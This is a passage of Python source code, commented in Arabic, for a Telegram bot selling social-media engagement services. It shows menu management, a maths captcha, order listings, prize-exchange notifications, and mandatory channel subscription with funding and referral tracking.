        # للمنصات (ig/tt/...) نتحقق من جميع الأزرار لا فقط builtin،
        # لأن أزرار "ربط بقسم" التي يضيفها المالك تُحفظ بنوع goto وليس builtin.
        if menu in SERVICE_PLATFORM_MENUS:
            existing = c.execute(
                "SELECT action_value FROM menu_items WHERE menu=?", (menu,)
            ).fetchall()
        else:
            existing = c.execute(
                "SELECT action_value FROM menu_items WHERE menu=? AND action_type='builtin'", (menu,)
            ).fetchall()
        existing_values = {r["action_value"] for r in existing}
        defaults = BUILTIN_DEFAULTS.get(menu, [])
        if not existing:
            for i, (label, value, width) in enumerate(defaults):
                c.execute(
                    "INSERT INTO menu_items (menu,label,action_type,action_value,width,sort_order,enabled) VALUES (?,?,?,?,?,?,1)",
                    (menu, label, "builtin", value, width, i)
                )
            return
        # نلحق أي أزرار أساسية جديدة أضيفت للكود بعد أول تشغيل (بدون التأثير على ترتيب/تعديلات المالك الحالية)
        row = c.execute("SELECT MAX(sort_order) AS m FROM menu_items WHERE menu=?", (menu,)).fetchone()
        next_order = (row["m"] or 0) + 1
        for label, value, width in defaults:
            if value not in existing_values:
                c.execute(
                    "INSERT INTO menu_items (menu,label,action_type,action_value,width,sort_order,enabled) VALUES (?,?,?,?,?,?,1)",
                    (menu, label, "builtin", value, width, next_order)
                )
                next_order += 1


def get_menu_items(menu: str, only_enabled: bool = True):
    seed_menu_items(menu)
    with db_conn() as c:
        q = "SELECT * FROM menu_items WHERE menu=?"
        if only_enabled:
            q += " AND enabled=1"
        q += " ORDER BY sort_order, id"
        return c.execute(q, (menu,)).fetchall()


def render_mb_menu_screen(menu: str):
    """يبني نص وأزرار شاشة إدارة أزرار قائمة معيّنة (مستخدم من عدة أماكن)."""
    items = get_menu_items(menu, only_enabled=False)
    rows = []
    for it in items:
        state_icon = "✅" if it["enabled"] else "🚫"
        width_icon = "▬ عريض" if it["width"] == 1 else "🔲 نصف"
        rows.append([InlineKeyboardButton(f"{state_icon} {it['label']}", callback_data="noop")])
        rows.append([
            InlineKeyboardButton("⬆️", callback_data=f"mb_up:{menu}:{it['id']}"),
            InlineKeyboardButton("⬇️", callback_data=f"mb_down:{menu}:{it['id']}"),
            InlineKeyboardButton(width_icon, callback_data=f"mb_width:{menu}:{it['id']}"),
            InlineKeyboardButton("🗑" if it["enabled"] else "♻️", callback_data=f"mb_toggle:{menu}:{it['id']}"),
        ])
    rows.append([InlineKeyboardButton("➕ إضافة زر جديد", callback_data=f"mb_add:{menu}")])
    rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="os:manage_buttons")])
    text = (f"🧩 *أزرار: {MENU_LABELS.get(menu, menu)}*\n\n"
            f"✅ ظاهر | 🚫 مخفي — اضغط 🗑 للإخفاء و♻️ للإظهار مجدداً.")
    return text, InlineKeyboardMarkup(rows)


def build_kb_rows(items):
    """يبني صفوف الأزرار مع مراعاة عرض كل زر (1=يملأ السطر لحاله، 2=زران بجانب بعض)."""
    rows = []
    pending = None
    for it in items:
        label = it["label"]
        if it["action_type"] == "url":
            btn = InlineKeyboardButton(label, url=it["action_value"])
        elif it["action_type"] == "text":
            btn = InlineKeyboardButton(label, callback_data=f"mi_text:{it['id']}")
        else:  # builtin أو goto - يستخدم callback_data مباشرة
            btn = InlineKeyboardButton(label, callback_data=it["action_value"])
        if it["width"] == 1:
            if pending:
                rows.append([pending])
                pending = None
            rows.append([btn])
        else:
            if pending:
                rows.append([pending, btn])
                pending = None
            else:
                pending = btn
    if pending:
        rows.append([pending])
    return rows


def md_escape(text: str) -> str:
    """يُهرّب رموز Markdown (النمط القديم) داخل نص متغيّر (اسم مستخدم/اسم كامل)
    قبل إدراجه في رسالة parse_mode=MARKDOWN، لتفادي فشل الإرسال بصمت عند وجود
    عدد فردي من _ أو * أو ` أو [ في اسم المستخدم (شائع جداً في يوزرات تيليجرام)."""
    if not text:
        return text
    for ch in ("_", "*", "`", "["):
        text = text.replace(ch, f"\\{ch}")
    return text


def generate_math():
    a, b = random.randint(1, 9), random.randint(1, 9)
    op = random.choice(['+', '-', '×'])
    if op == '+': return f"{a} + {b}", a + b
    if op == '-':
        a, b = max(a, b), min(a, b)
        return f"{a} - {b}", a - b
    return f"{a} × {b}", a * b

# ────────────────────────────────────────────────────────────
#  لوحات المفاتيح
# ────────────────────────────────────────────────────────────
def main_menu_kb(is_owner=False):
    rows = build_kb_rows(get_menu_items("main"))
    if is_owner:
        rows.append([InlineKeyboardButton("🧩 إضافة/إزالة خيار", callback_data="mb_menu:main")])
        rows.append([InlineKeyboardButton("⚙️ إعدادات المالك", callback_data="owner_settings")])
    return InlineKeyboardMarkup(rows)

def _render_service_list():
    """يبني نص وأزرار قائمة الخدمات (يُستخدم من العرض والتفعيل/التعطيل)."""
    with db_conn() as c:
        svcs = c.execute("SELECT * FROM services ORDER BY category, id").fetchall()
    if not svcs:
        return "📋 لا توجد خدمات مضافة.", None
    lines = ["📋 *قائمة الخدمات:*\n"]
    for s in svcs:
        status = "✅" if s["active"] else "❌"
        site_name = PANEL_MAP.get(s["panel"] or 1, PANEL_MAP[1])["name"]
        plat_lbl = PLATFORM_LABEL_MAP.get(s.get("platform") or "tg", "📱 تيلجرام")
        lines.append(
            f"{status} [{s['id']}] *{s['name_ar']}*\n"
            f"{plat_lbl} | الفئة: {CATEGORY_MAP.get(s['category'], s['category'])} | الموقع: {site_name} | Min:{s['min_qty']} Max:{s['max_qty']}\n"
        )
    rows = []
    for s in svcs:
        tog = "❌ تعطيل" if s["active"] else "✅ تفعيل"
        rows.append([
            InlineKeyboardButton(f"{s['name_ar'][:20]}", callback_data="noop"),
            InlineKeyboardButton("✏️ تعديل", callback_data=f"os_edit_svc:{s['id']}"),
            InlineKeyboardButton(tog, callback_data=f"os_tog_svc:{s['id']}:{1 if not s['active'] else 0}"),
            InlineKeyboardButton("🗑", callback_data=f"os_del_svc:{s['id']}")
        ])
    rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="owner_settings")])
    return "\n".join(lines), rows


async def send_services_overview(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """يعرض كل الخدمات مجمّعة حسب الفئة — رسالة مستقلة لكل فئة (الأعضاء برسالة، التفاعلات برسالة، وهكذا)."""
    chat_id = update.effective_chat.id
    sent_any = False
    first = True
    for cat_key, cat_name in CATEGORY_MAP.items():
        with db_conn() as c:
            svcs = c.execute(
                "SELECT * FROM services WHERE category=? ORDER BY id", (cat_key,)
            ).fetchall()
        if not svcs:
            continue
        sent_any = True
        lines = [f"📂 *{cat_name}*\n"]
        for s in svcs:
            status = "✅ متاحة" if s["active"] else "❌ معطّلة"
            site_name = PANEL_MAP.get(s["panel"] or 1, PANEL_MAP[1])["name"]
            plat_lbl = PLATFORM_LABEL_MAP.get(s.get("platform") or "tg", "📱 تيلجرام")
            lines.append(
                f"{status} *{s['name_ar']}*\n"
                f"📱 المنصة: {plat_lbl}\n"
                f"💰 السعر: {fmt_price(s['price_per_point'])} نقطة / 1000 وحدة\n"
                f"📝 الوصف: {s['description'] or '—'}\n"
                f"📉 الحد الأدنى: {s['min_qty']} | 📈 الحد الأعلى: {s['max_qty']}\n"
                f"🌐 الموقع: {site_name}\n"
            )
        text = "\n".join(lines)
        if first and update.callback_query:
            await update.callback_query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
            first = False
        else:
            await context.bot.send_message(chat_id=chat_id, text=text, parse_mode=ParseMode.MARKDOWN)

    if not sent_any:
        if update.callback_query:
            await update.callback_query.edit_message_text("📋 لا توجد خدمات مضافة بعد.", reply_markup=owner_settings_kb())
        else:
            await context.bot.send_message(chat_id=chat_id, text="📋 لا توجد خدمات مضافة بعد.", reply_markup=owner_settings_kb())
        return

    await context.bot.send_message(chat_id=chat_id, text="⬆️ هذه كل الخدمات المتاحة حالياً.", reply_markup=owner_settings_kb())


ORDERS_PAGE_SIZE = 10

def _fetch_orders_page(offset: int = 0, limit: int = ORDERS_PAGE_SIZE):
    with db_conn() as c:
        rows = c.execute(
            """SELECT o.*, u.full_name AS u_full_name, u.username AS u_username,
                      s.name_ar AS s_name_ar, s.category AS s_category
               FROM orders o
               LEFT JOIN users u ON u.user_id = o.user_id
               LEFT JOIN services s ON s.id = o.service_id
               ORDER BY o.id DESC
               LIMIT %s OFFSET %s""",
            (limit, offset)
        ).fetchall()
        total = c.execute("SELECT COUNT(*) AS cnt FROM orders").fetchone()["cnt"]
    return rows, total


def _render_order_block(o) -> str:
    uname = f"@{o['u_username']}" if o.get("u_username") else "—"
    full_name = o.get("u_full_name") or "—"
    service_name = o.get("s_name_ar") or f"خدمة #{o['service_id']}"
    category = CATEGORY_MAP.get(o.get("s_category"), o.get("s_category") or "—")
    status_map = {"pending": "⏳ قيد التنفيذ", "completed": "✅ مكتمل", "cancelled": "❌ ملغي"}
    status = status_map.get(o["status"], o["status"])
    return (
        f"🧾 *كود الطلب:* {o['order_code']}\n"
        f"👤 *صاحب الطلب:* {full_name} ({uname}) — ID: `{o['user_id']}`\n"
        f"📦 *نوع الطلب:* {service_name} ({category})\n"
        f"🔗 *الرابط:* {o['link'] or '—'}\n"
        f"🔢 *الكمية:* {o['quantity']}\n"
        f"💰 *التكلفة:* {o['cost_points']} نقطة" + (f" + {o['cost_stars']} نجمة" if o.get("cost_stars") else "") + "\n"
        f"📶 *الحالة:* {status}\n"
        f"🆔 *رقم API:* {o['api_order_id'] or '—'}\n"
        f"🕒 *الوقت:* {o['created_at']}\n"
    )


async def show_orders_section(update: Update, context: ContextTypes.DEFAULT_TYPE, offset: int = 0):
    rows, total = _fetch_orders_page(offset)
    if not rows:
        text = "📦 لا توجد طلبات بعد." if offset == 0 else "📦 لا مزيد من الطلبات."
        kb_rows = [[InlineKeyboardButton("🔍 بحث بكود الطلب", callback_data="os:order_lookup")],
                   [InlineKeyboardButton("🔙 رجوع", callback_data="owner_settings")]]
        if update.callback_query:
            await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb_rows))
        else:
            await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb_rows))
        return

    blocks = [_render_order_block(o) for o in rows]
    header = f"📦 *قسم الطلبات* ({offset + 1}-{offset + len(rows)} من {total})\n\n"
    text = header + "\n➖➖➖➖➖\n".join(blocks)

    nav = []
    if offset + ORDERS_PAGE_SIZE < total:
        nav.append(InlineKeyboardButton("◀️ الأقدم", callback_data=f"os:orders_page:{offset + ORDERS_PAGE_SIZE}"))
    if offset > 0:
        nav.append(InlineKeyboardButton("الأحدث ▶️", callback_data=f"os:orders_page:{max(0, offset - ORDERS_PAGE_SIZE)}"))
    kb_rows = []
    if nav:
        kb_rows.append(nav)
    kb_rows.append([InlineKeyboardButton("🔍 بحث بكود الطلب", callback_data="os:order_lookup")])
    kb_rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="owner_settings")])

    if update.callback_query:
        await update.callback_query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN,
                                                        reply_markup=InlineKeyboardMarkup(kb_rows))
    else:
        await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN,
                                         reply_markup=InlineKeyboardMarkup(kb_rows))


def owner_settings_kb():
    rows = build_kb_rows(get_menu_items("owner_settings"))
    # يعرض حالة وضع الصيانة (مفعل/مغلق) مباشرة على نص الزر نفسه، لا فقط في رسالة التبديل
    _maint_on = is_maintenance_on()
    _maint_suffix = " (مفعل ✅)" if _maint_on else " (مغلق ❌)"
    _numex_on = is_number_exchange_on()
    _numex_suffix = " (مفعل ✅)" if _numex_on else " (مغلق ❌)"
    # حالة التحقق الإجباري (عدد القنوات النشطة)
    _mandatory_active = count_active_mandatory_channels()
    _verify_suffix = f" ({_mandatory_active} قناة ✅)" if _mandatory_active > 0 else " (مغلق ❌)"
    for row in rows:
        for i, btn in enumerate(row):
            if btn.callback_data == "os:toggle_maintenance":
                base_label = btn.text.split(" (")[0]
                row[i] = InlineKeyboardButton(base_label + _maint_suffix, callback_data="os:toggle_maintenance")
            elif btn.callback_data == "os:toggle_number_exchange":
                base_label = btn.text.split(" (")[0]
                row[i] = InlineKeyboardButton(base_label + _numex_suffix, callback_data="os:toggle_number_exchange")
            elif btn.callback_data == "os:manage_channels":
                base_label = btn.text.split(" (")[0]
                row[i] = InlineKeyboardButton(base_label + _verify_suffix, callback_data="os:manage_channels")
    rows.append([InlineKeyboardButton("🧩 إضافة/إزالة خيار", callback_data="mb_menu:owner_settings")])
    rows.append([InlineKeyboardButton("🔙 القائمة الرئيسية", callback_data="main_menu")])
    return InlineKeyboardMarkup(rows)

def charge_points_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⭐ الشحن عبر النجوم", callback_data="charge:stars")],
        [InlineKeyboardButton("📱 الشحن عبر اسيا سيل", callback_data="charge:asiacell")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")],
    ])

def charge_stars_kb():
    rate = int(get_setting("star_to_points") or "250")
    quick_amounts = [1, 2, 5, 10, 25, 50, 100, 250, 500, 1000]
    quick_rows = []
    for i in range(0, len(quick_amounts), 5):
        row = [InlineKeyboardButton(f"{n} ⭐", callback_data=f"charge:quick:{n}") for n in quick_amounts[i:i+5]]
        quick_rows.append(row)
    rows = [
        [InlineKeyboardButton(f"1 ⭐ = {rate} نقطة", callback_data="charge:info")],
    ] + quick_rows + [
        [InlineKeyboardButton("🔢 شحن عدد نقاط معين", callback_data="charge:by_points"),
         InlineKeyboardButton("⭐ شحن بعدد نجوم معين", callback_data="charge:by_stars")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="charge_points")],
    ]
    return InlineKeyboardMarkup(rows)

def exchange_kb():
    with db_conn() as c:
        prizes = c.execute(
            "SELECT id, name, quantity, points_cost FROM custom_prizes WHERE active=1 ORDER BY id"
        ).fetchall()
    rows = [
        [InlineKeyboardButton("⭐ استبدال نقاط بنجوم", callback_data="exchange:stars")],
        [InlineKeyboardButton("📱 شراء رقم تيلغرام",  callback_data="exchange:number")],
        [InlineKeyboardButton("🎟 شراء عبر كود",       callback_data="exchange:num_code")],
    ]
    for p in prizes:
        # يُعرض الاسم فقط — السعر يظهر بعد الضغط
        rows.append([InlineKeyboardButton(
            f"🎁 {p['name']}",
            callback_data=f"exchange:custom:{p['id']}"
        )])
    rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")])
    return InlineKeyboardMarkup(rows)

def fund_channel_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 تمويل قناة إجباري سريع", callback_data="fund:mandatory")],
        [InlineKeyboardButton("🔄 تمويل قناة داخلي بطيء", callback_data="fund:internal")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")],
    ])

def _leave_penalty_note() -> str:
    penalty = int(get_setting("channel_leave_penalty") or "75")
    return f"\n⚠️ *ملاحظة:* إذا غادرت القناة بعد الحصول على نقاطها سيتم خصم *{penalty} نقطة* من رصيدك تلقائياً."

def back_kb(target="main_menu"):
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=target)]])

def contact_owner_row() -> list:
    """يُرجع صفاً يحتوي زر تواصل مع المالك إن كان رابط التواصل مضبوطاً، وإلا قائمة فارغة."""
    contact = get_setting("owner_contact") or ""
    if not contact:
        return []
    label = get_setting("owner_contact_label") or "💬 تواصل مع المالك"
    return [[InlineKeyboardButton(label, url=contact)]]

# ────────────────────────────────────────────────────────────
#  إرسال إشعار للكروب
# ────────────────────────────────────────────────────────────
async def notify_group(app, text: str, reply_markup=None):
    if ADMIN_GROUP_ID:
        try:
            await app.bot.send_message(ADMIN_GROUP_ID, text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
        except Exception as e:
            logger.warning(f"notify_group error: {e}")


def _unseen_purchase_count(exclude_pe_id: int | None = None) -> int:
    """عدد عمليات الشراء التي لم يطّلع عليها المالك بعد."""
    try:
        with db_conn() as c:
            if exclude_pe_id:
                row = c.execute(
                    "SELECT COUNT(*) as cnt FROM prize_exchanges WHERE owner_seen=FALSE AND id != %s",
                    (exclude_pe_id,)
                ).fetchone()
            else:
                row = c.execute(
                    "SELECT COUNT(*) as cnt FROM prize_exchanges WHERE owner_seen=FALSE"
                ).fetchone()
            return int(row["cnt"]) if row else 0
    except Exception:
        return 0


def _unseen_badge_html(exclude_pe_id: int | None = None) -> str:
    """يُرجع سطر HTML يبيّن عدد العمليات غير المطّلع عليها (عدا الحالية)، أو فارغ إن لم توجد."""
    cnt = _unseen_purchase_count(exclude_pe_id=exclude_pe_id)
    if cnt > 0:
        return f'🔔 <b>تنبيه: لديك {cnt} عملية شراء أخرى لم تطّلع عليها بعد.</b>\n\n'
    return ''


def prize_exchange_admin_kb(pe_id: int) -> InlineKeyboardMarkup:
    """أزرار المالك على إشعار طلب استبدال: تمييزه كمكتمل (تم التسليم)، أو إعلام
    الطالب بأن طلبه قيد المعالجة إن لم يكتمل بعد."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ مكتمل (تم التسليم)", callback_data=f"pe_complete:{pe_id}")],
        [InlineKeyboardButton("⏳ غير مكتمل (إعلام الطالب)", callback_data=f"pe_ack:{pe_id}")],
    ])


async def notify_prize_exchange_owner(context, pe_id: int, text_html: str):
    """يرسل إشعار طلب الاستبدال إلى كروب الإدارة (إن كان مُعرّفاً) كنص فقط بدون
    أزرار/علامة الحالة، وإلى خاص المالك (البوت) مع أزرار مكتمل/غير مكتمل —
    التحكم بالحالة يبقى حصراً داخل البوت."""
    badge = _unseen_badge_html(exclude_pe_id=pe_id)
    full_text = badge + text_html
    kb = prize_exchange_admin_kb(pe_id)
    await notify_group(context.application, full_text)
    if OWNER_ID:
        try:
            await context.bot.send_message(OWNER_ID, full_text, parse_mode=ParseMode.HTML, reply_markup=kb)
        except Exception as e:
            logger.warning(f"notify_prize_exchange_owner error: {e}")

# ────────────────────────────────────────────────────────────
#  عرض خدمات الفئة
# ────────────────────────────────────────────────────────────
async def show_category_services(update: Update, context: ContextTypes.DEFAULT_TYPE, category: str):
    # فئات الرشق الأساسية أصبحت داخل قائمة "📱 تيلجرام" ضمن "🛍 خدمات"، فيجب الرجوع إليها بدل القائمة الرئيسية مباشرة
    platform = context.user_data.get("current_platform", "tg") if context else "tg"
    back_map = {"tg": "services_menu_tg", "ig": "services_menu_ig", "tt": "services_menu_tt",
                "wa": "services_menu_wa", "fb": "services_menu_fb", "yt": "services_menu_yt",
                "sc": "services_menu_sc", "tw": "services_menu_tw"}
    back_target = back_map.get(platform, "services_menu_tg") if category in SERVICES_MENU_CATEGORIES else "main_menu"
    with db_conn() as c:
        svcs = c.execute(
            "SELECT * FROM services WHERE category=%s AND platform=%s AND active=1", (category, platform)
        ).fetchall()
    # احتياط: إذا لم تجد خدمات للمنصة المحددة، ابحث في 'tg' كاحتياط للخدمات القديمة غير المنقولة
    if not svcs and platform != "tg":
        with db_conn() as c:
            svcs = c.execute(
                "SELECT * FROM services WHERE category=%s AND (platform=%s OR platform IS NULL) AND active=1",
                (category, platform)
            ).fetchall()
    if not svcs:
        kb = back_kb(back_target)
        text = f"⚠️ لا توجد خدمات متاحة في ({CATEGORY_MAP.get(category, category)}) حالياً.\nتواصل مع المالك لإضافة خدمات."
        if update.callback_query:
            await update.callback_query.edit_message_text(text, reply_markup=kb)
        else:
            await update.message.reply_text(text, reply_markup=kb)
        return
    rows = []
    for s in svcs:
        rows.append([InlineKeyboardButton(
            f"{'⭐' if s['category']=='post_stars' else '🔹'} {s['name_ar']}",
            callback_data=f"svc:{s['id']}"
        )])
    extra_items = get_menu_items(f"cat:{category}")
    rows.extend(build_kb_rows(extra_items))
    _cat_user = update.effective_user
    if _cat_user and _cat_user.id == OWNER_ID:
        rows.append([InlineKeyboardButton("🧩 إضافة/إزالة خيار", callback_data=f"mb_menu:cat:{category}")])
    rows.append([InlineKeyboardButton("🔙 رجوع", callback_data=back_target)])
    text = f"📦 *{CATEGORY_MAP.get(category, category)}*\nاختر الخدمة المطلوبة:"
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(rows),
                                                      parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(rows),
                                        parse_mode=ParseMode.MARKDOWN)

# ────────────────────────────────────────────────────────────
#  الاشتراك الإجباري + التحقق النهائي
# ────────────────────────────────────────────────────────────
MANDATORY_MAX_ACTIVE = 10   # الحد الأقصى لعدد القنوات الإجبارية النشطة في نفس الوقت
MANDATORY_PAGE_SIZE   = 5   # عدد القنوات المعروضة للمستخدم دفعة واحدة في بوابة الاشتراك


def count_active_mandatory_channels() -> int:
    with db_conn() as c:
        row = c.execute(
            "SELECT COUNT(*) AS n FROM mandatory_channels WHERE active=1 AND funding_type='mandatory'"
        ).fetchone()
    return row["n"] if row else 0


async def promote_queued_mandatory_channel(context: ContextTypes.DEFAULT_TYPE, app=None):
    """يُستدعى بعد أي إخراج لقناة إجبارية من القائمة النشطة (اكتمال تمويلها أو تعطيلها يدوياً).
    إن وُجدت قناة إجبارية بانتظار الدور (queued=1) وتوفّر عدد أقل من الحد الأقصى، تُفعَّل تلقائياً
    وتُخطَر مالكها ويُعلَن عنها في الكروب، حتى لا يبقى دور القناة معلّقاً بلا داعٍ."""
    if count_active_mandatory_channels() >= MANDATORY_MAX_ACTIVE:
        return
    with db_conn() as c:
        nxt = c.execute(
            "SELECT * FROM mandatory_channels WHERE queued=1 AND funding_type='mandatory' ORDER BY id ASC LIMIT 1"
        ).fetchone()
        if not nxt:
            return
        c.execute("UPDATE mandatory_channels SET active=1, queued=0 WHERE id=?", (nxt["id"],))

    try:
        await context.bot.send_message(
            nxt["owner_user_id"],
            f"🎉 *أصبحت قناتك الآن ضمن قائمة الاشتراك الإجباري!*\n\n"
            f"📢 القناة: @{nxt['channel_username']}\n"
            f"✅ تحرّر أحد الأماكن العشرة فأصبح دور قناتك، وباتت تظهر الآن لجميع مستخدمي البوت.",
            parse_mode=ParseMode.MARKDOWN
        )
    except Exception:
        pass

    # ملاحظة: لم يعد يُرسَل إعلان بهذا في كروب الإشعارات — الكروب أصبح مخصصاً
    # للطلبات فقط (خدمات/استبدال/تمويل قنوات)، وهذا مجرد تفعيل تلقائي داخلي.


def mandatory_terms_text_html() -> str:
    """نص الشروط المرفق مع أي إعلان في الكروب عن قناة إجبارية جديدة (HTML)."""
    penalty = int(get_setting("channel_leave_penalty") or "75")
    return (
        f"📌 <b>الشروط:</b>\n"
        f"• الاشتراك بهذه القناة أصبح إجبارياً لاستخدام البوت.\n"
        f"• الحد الأقصى للقنوات الإجبارية النشطة في نفس الوقت: {MANDATORY_MAX_ACTIVE} قنوات.\n"
        f"• مغادرة القناة بعد التحقق تخصم {penalty} نقطة تلقائياً من رصيد المستخدم."
    )


async def get_unjoined_mandatory_channels(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    """يُرجع قائمة القنوات الإجبارية التي لم ينضم لها المستخدم بعد."""
    with db_conn() as c:
        channels = c.execute(
            "SELECT * FROM mandatory_channels WHERE active=1 AND funding_type='mandatory'"
        ).fetchall()
    unjoined = []
    for ch in channels:
        try:
            member = await context.bot.get_chat_member(f"@{ch['channel_username']}", user_id)
            if member.status in ("left", "kicked", "banned"):
                unjoined.append(ch)
        except Exception:
            # تعذّر التحقق (مثلاً البوت ليس مشرفاً بالقناة) — نعتبرها غير منضمة احتياطاً
            unjoined.append(ch)
    return unjoined


async def count_user_for_fundings(user_id: int, context):
    """
    تحسب هذا المستخدم ضمن التمويلات النشطة التي لم يُحسب فيها بعد.
    الشرط: يجب أن يكون المستخدم قد انضم عبر البوت (سجل في channel_join_rewards).
    عند اكتمال أي تمويل: يُوقَف تلقائياً ويُرسَل إشعار لصاحبه.
    """
    with db_conn() as c:
        fundings = c.execute(
            """SELECT cf.id, cf.channel_username, cf.funding_type,
                      cf.target_members, cf.current_members, cf.user_id AS owner_id,
                      mc.id AS mc_id
               FROM channel_funding cf
               JOIN mandatory_channels mc ON mc.channel_username = cf.channel_username
               WHERE mc.active = 1 AND cf.status = 'active' AND cf.target_members > 0"""
        ).fetchall()

    for f in fundings:
        # ── شرط التمييز: لا يُحسب إلا من ثبت انضمامه فعلاً ──
        if f["funding_type"] == "internal":
            # القنوات الداخلية: الإثبات هو ضغط "تحقق من انضمامي" (يُسجَّل في channel_join_rewards)
            with db_conn() as c:
                verified = c.execute(
                    "SELECT 1 FROM channel_join_rewards WHERE user_id=%s AND channel_id=%s",
                    (user_id, f["mc_id"])
                ).fetchone()
            if not verified:
                continue
        else:
            # القنوات الإجبارية: لا تمر عبر تدفّق "تحقق من انضمامي" أبداً، لذا نتحقق
            # من العضوية مباشرة عبر تيليجرام بدل الاعتماد على channel_join_rewards
            # (التي لا تُسجَّل أصلاً لهذا النوع — كانت سبب بقاء العدّاد عند 0 دائماً).
            try:
                member = await context.bot.get_chat_member(f"@{f['channel_username']}", user_id)
                if member.status in ("left", "kicked", "banned"):
                    continue
            except Exception:
                continue
        with db_conn() as c:
            c.execute(
                "INSERT INTO channel_funding_counts (user_id, funding_id) VALUES (%s, %s) "
                "ON CONFLICT (user_id, funding_id) DO NOTHING",
                (user_id, f["id"])
            )
            if c.rowcount == 0:
                continue
            c.execute(
                "UPDATE channel_funding SET current_members = current_members + 1 WHERE id = %s",
                (f["id"],)
            )
            row = c.execute(
                "SELECT current_members, target_members FROM channel_funding WHERE id = %s",
                (f["id"],)
            ).fetchone()

        if not row:
            continue
        if row["current_members"] >= row["target_members"]:
            # ✅ اكتمل التمويل — أوقف القناة وأبلغ المالك
            with db_conn() as c:
                c.execute("UPDATE channel_funding SET status='completed' WHERE id=%s", (f["id"],))
                c.execute("UPDATE mandatory_channels SET active=0 WHERE channel_username=%s", (f["channel_username"],))
            try:
                ft_label = "إجباري سريع" if f["funding_type"] == "mandatory" else "داخلي بطيء"
                await context.bot.send_message(
                    chat_id=f["owner_id"],
                    text=(
                        f"🎉 *اكتمل تمويل قناتك!*\n\n"
                        f"📢 القناة: @{f['channel_username']}\n"
                        f"⚙️ النوع: {ft_label}\n"
                        f"👥 العدد المستهدف: {f['target_members']:,} عضو — ✅ تم الوصول!"
                    ),
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception:
                pass
            if f["funding_type"] == "mandatory":
                await promote_queued_mandatory_channel(context)


def mandatory_join_kb(channels, is_owner=False):
    page = channels[:MANDATORY_PAGE_SIZE]
    rows = []
    for ch in page:
        rows.append([InlineKeyboardButton(
            f"📢 {ch['channel_title'] or ('@' + ch['channel_username'])}",
            url=f"https://t.me/{ch['channel_username']}"
        )])
    rows.append([InlineKeyboardButton("✅ تحقق من الاشتراك", callback_data="check_mandatory_join")])
    if is_owner:
        rows.append([InlineKeyboardButton("⏭ تخطى (للمالك فقط)", callback_data="skip_mandatory_gate")])
    return InlineKeyboardMarkup(rows)


async def show_mandatory_gate(update: Update, context: ContextTypes.DEFAULT_TYPE, channels, edit=False, is_owner=False):
    remaining = max(0, len(channels) - MANDATORY_PAGE_SIZE)
    more_note = (
        f"\n\n➕ يوجد *{remaining}* قناة إضافية ستظهر تلقائياً بعد إكمال هذه المجموعة."
        if remaining > 0 else ""
    )
    text = (
        "📢 *الاشتراك الإجباري*\n\n"
        "للمتابعة، يجب عليك الاشتراك بالقنوات التالية أولاً:\n"
        "ثم اضغط «✅ تحقق من الاشتراك»."
        f"{more_note}"
    )
    kb = mandatory_join_kb(channels, is_owner=is_owner)
    if edit and update.callback_query:
        await update.callback_query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
    else:
        await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)


async def proceed_after_mandatory(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=False):
    """بعد اجتياز بوابة الاشتراك الإجباري: يعرض سؤال التحقق الرياضي إن كان مفعّلاً، وإلا يُنهي التحقق مباشرة."""
    user = update.effective_user
    captcha_on = int(get_setting("captcha_enabled") or "0")
    if not captcha_on:
        await finalize_verification(update, context, user, edit=edit)
        return

    prob, ans = generate_math()
    context.user_data["state"] = "verify_math"
    context.user_data["math_ans"] = ans

    text = f"🔐 للدخول للبوت، أجب على هذه المسألة البسيطة:\n\n❓  *{prob} = ؟*"
    if edit and update.callback_query:
        await update.callback_query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)


async def finalize_verification(update: Update, context: ContextTypes.DEFAULT_TYPE, user, edit=False):
    """تُستدعى بعد اجتياز الاشتراك الإجباري والتحقق: تُفعّل المستخدم، تمنح نقاط الإحالة، وتعرض القائمة الرئيسية."""
    set_user_verified(user.id)
    await count_user_for_fundings(user.id, context)
    is_own = (user.id == OWNER_ID)

    referral_note = ""
    credited = credit_referral_if_pending(user.id, context)
    if credited:
        invited_by, rp = credited
        invited_name = md_escape(f"@{user.username}") if user.username else md_escape(user.full_name or "مستخدم")
        inviter_row = get_user(invited_by)
        inviter_name = "صديقك"
        if inviter_row:
            inviter_username = inviter_row.get("username")
            inviter_full_name = inviter_row.get("full_name")
            inviter_name = md_escape(f"@{inviter_username}") if inviter_username else md_escape(inviter_full_name or "صديقك")
        try:
            await context.bot.send_message(
                chat_id=invited_by,
                text=f"🎉 مبروك! لقد أكمل المستخدم {invited_name} الاشتراك والتحقق عن طريق رابط دعوتك، وحصلت على {rp} نقطة.",
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception as _e:
            logger.warning(f"⚠️ فشل إرسال إشعار الإحالة للمستخدم {invited_by}: {_e}")
        referral_note = f"\n\n🔗 لقد دخلت إلى رابط دعوة صديقك {inviter_name} وقد حصل على {rp} نقطة."

    context.user_data["state"] = "main_menu"
    db_user = get_user(user.id)
